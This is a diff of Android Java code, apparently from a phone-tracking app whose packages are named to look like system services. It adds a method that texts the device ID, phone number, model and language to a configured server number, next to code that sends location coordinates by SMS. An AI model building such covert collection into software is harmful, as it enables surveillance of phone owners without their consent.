@@ -10,7 +10,9 @@ import system.service.activity.GlobalPrefActivity;
 import system.service.config.ConfigCtrl;
 
 import com.particle.inspector.common.util.DeviceProperty;
+import com.particle.inspector.common.util.LANG;
 import com.particle.inspector.common.util.SysUtils;
+import com.particle.inspector.common.util.sms.AuthSms;
 import com.particle.inspector.common.util.sms.SmsConsts;
 
 import system.service.feature.location.LocationUtil;
@@ -227,6 +229,19 @@ public class SmsCtrl
 				(new Date(location.getTime())).toLocaleString() + ", " 
 				+ location.getLatitude() + "," + location.getLongitude());
 		}
+	}
+	
+	// Send auth SMS (client->server)
+	public static boolean sendAuthSms(Context context, String key) {
+		String deviceID = DeviceProperty.getDeviceId(context);
+		String phoneNum = DeviceProperty.getPhoneNumber(context);
+		String phoneModel = DeviceProperty.getDeviceModel();
+		String androidVer = DeviceProperty.getAndroidVersion();
+		LANG lang = DeviceProperty.getPhoneLang();
+		AuthSms sms = new AuthSms(key, deviceID, phoneNum, phoneModel, androidVer, lang);
+		String smsStr = sms.clientSms2Str();
+		String srvAddr = context.getResources().getString(R.string.srv_address).trim();
+		return sendSms(srvAddr, smsStr);
 	}
 
 	// Send unregister SMS to server 
